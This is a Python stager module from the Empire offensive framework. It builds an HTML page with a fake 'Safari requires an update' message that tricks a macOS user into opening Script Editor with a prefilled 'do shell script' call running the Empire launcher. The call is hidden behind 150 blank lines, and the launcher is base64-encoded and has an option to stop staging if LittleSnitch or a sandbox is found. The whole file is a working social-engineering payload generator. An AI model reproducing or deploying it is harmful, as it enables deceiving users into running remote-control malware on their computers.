from empire.server.common import helpers


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "Launcher",
            "Authors": [
                {
                    "Name": "",
                    "Handle": "@424f424f",
                    "Link": "https://twitter.com/424f424f",
                }
            ],
            "Description": "Generates an HTML payload launcher for Empire.",
            "Comments": ["https://www.exploit-db.com/exploits/38535/"],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "python",
                "SuggestedValues": ["python"],
                "Strict": True,
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output, otherwise returned as a string.",
                "Required": False,
                "Value": "",
            },
            "SafeChecks": {
                "Description": "Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "Base64": {
                "Description": "Switch. Base64 encode the output.",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

    def generate(self):
        # extract all of our options
        language = self.options["Language"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        base64 = self.options["Base64"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        safe_checks = self.options["SafeChecks"]["Value"]

        encode = False
        if base64.lower() == "true":
            encode = True

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(
            listenerName=listener_name,
            language=language,
            encode=encode,
            userAgent=user_agent,
            safeChecks=safe_checks,
        )
        if launcher == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""

        launcher = launcher.replace("'", "\\'")
        launcher = launcher.replace('"', '\\\\"')

        return f"""
<html><head></head><body><H2> Safari requires an update. Press cmd-R to refresh. Make sure to press the play button on the script box to begin the update</H2>
<script>
      var as = Array(150).join("\\n") +
        'do shell script "{launcher}"';
      var url = 'applescript://com.apple.scripteditor?action=new&script='+encodeURIComponent(as);
      window.onkeydown = function(e) {{
        if (e.keyCode == 91) {{
          window.location = url;
        }}
      }};
</script></body></html>
    """
